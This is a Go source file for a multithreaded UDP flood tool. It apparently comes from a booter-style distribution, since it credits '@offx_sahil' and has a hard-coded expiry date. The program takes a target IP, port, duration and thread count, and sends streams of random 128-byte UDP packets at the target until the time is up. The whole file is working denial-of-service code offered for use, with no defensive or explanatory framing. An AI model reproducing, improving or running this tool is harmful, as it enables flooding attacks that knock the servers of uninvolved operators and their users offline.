package main

import (
	"crypto/rand"
	"fmt"
	mrand "math/rand" // alias math/rand to mrand
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

// Struct to hold attack data
type threadData struct {
	ip   string
	port int
	time int
}

// Usage function to display how to run the program
func usage() {
	fmt.Println("Usage: ./sahil <ip> <port> <time> <threads>")
	os.Exit(1)
}

// Function to check if the current date is past the expiry date
func checkExpiryDate() {
	expiryDate := time.Date(2025, 1, 10, 0, 0, 0, 0, time.UTC)
	currentTime := time.Now()
	if currentTime.After(expiryDate) {
		fmt.Printf("The program has expired as of %02d/%02d/%d and can no longer be used.\n",
			expiryDate.Day(), expiryDate.Month(), expiryDate.Year())
		os.Exit(1)
	} else {
		fmt.Printf("Note: Made by @offx_sahil. This program will expire on %02d/%02d/%d.\n",
			expiryDate.Day(), expiryDate.Month(), expiryDate.Year())
	}
}

// Function to generate a random payload of specified size
func generateRandomPayload(size int) []byte {
	payload := make([]byte, size)
	_, err := rand.Read(payload) // Using crypto/rand for secure random generation
	if err != nil {
		fmt.Println("Failed to generate random payload:", err)
		return nil
	}
	return payload
}

// Function to generate multiple random payloads
func generateMultiplePayloads() [][]byte {
	payloads := [][]byte{
		generateRandomPayload(128),
		generateRandomPayload(128),
		generateRandomPayload(128),
		generateRandomPayload(128),
		generateRandomPayload(128),
	}
	return payloads
}

// Function to shuffle the payloads
func shufflePayloads(payloads [][]byte) [][]byte {
	mrand.Seed(time.Now().UnixNano()) // Correct seeding with math/rand
	mrand.Shuffle(len(payloads), func(i, j int) {
		payloads[i], payloads[j] = payloads[j], payloads[i]
	})
	return payloads
}

// Function to perform attack with controlled concurrency and random payloads
func attack(data threadData, wg *sync.WaitGroup, conn *net.UDPConn) {
	defer wg.Done()
	payloads := generateMultiplePayloads()
	if payloads == nil {
		fmt.Println("Failed to generate payloads. Exiting attack.")
		return
	}
	shuffledPayloads := shufflePayloads(payloads)
	endTime := time.Now().Add(time.Duration(data.time) * time.Second)
	for time.Now().Before(endTime) {
		for _, payload := range shuffledPayloads {
			_, err := conn.Write(payload)
			if err != nil {
				fmt.Println("Send failed:", err)
				return
			}
		}
	}
}

// Countdown timer function
func countdown(seconds int) {
	for seconds > 0 {
		fmt.Printf("\rTime remaining: %d seconds", seconds)
		time.Sleep(1 * time.Second)
		seconds--
	}
	fmt.Println()
}

func main() {
	if len(os.Args) != 5 {
		usage()
	}
	checkExpiryDate()
	ip := os.Args[1]
	port, err := strconv.Atoi(os.Args[2])
	if err != nil || port <= 0 || port > 65535 {
		fmt.Println("Invalid port number")
		os.Exit(1)
	}
	duration, err := strconv.Atoi(os.Args[3])
	if err != nil || duration <= 0 {
		fmt.Println("Invalid duration value")
		os.Exit(1)
	}
	threads, err := strconv.Atoi(os.Args[4])
	if err != nil || threads <= 0 {
		fmt.Println("Invalid number of threads")
		os.Exit(1)
	}

	fmt.Printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, duration, threads)
	serverAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		fmt.Println("Failed to resolve UDP address:", err)
		os.Exit(1)
	}

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		conn, err := net.DialUDP("udp", nil, serverAddr)
		if err != nil {
			fmt.Println("Failed to create UDP connection:", err)
			continue
		}
		defer conn.Close()

		wg.Add(1)
		go attack(threadData{ip, port, duration}, &wg, conn)
	}

	countdown(duration)
	wg.Wait()
	fmt.Println("Attack finished. Join @offx.sahil")
}